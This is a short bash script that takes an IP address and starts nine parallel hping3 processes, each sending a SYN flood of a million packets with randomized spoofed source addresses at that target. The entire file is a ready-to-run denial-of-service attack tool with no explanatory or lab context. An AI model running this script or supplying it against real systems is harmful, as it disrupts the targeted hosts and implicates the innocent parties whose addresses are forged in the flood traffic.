#!/usr/bin/env bash

if [ $# -ne 1 ] 
then 
	echo "Usage: $0 ip"
	exit 1
fi 

for ((i=1; i<10 ; i++))
do 
#	echo "abc"
	hping3 -c 1000000 -d 20 -S --flood $1 --rand-source  &

done

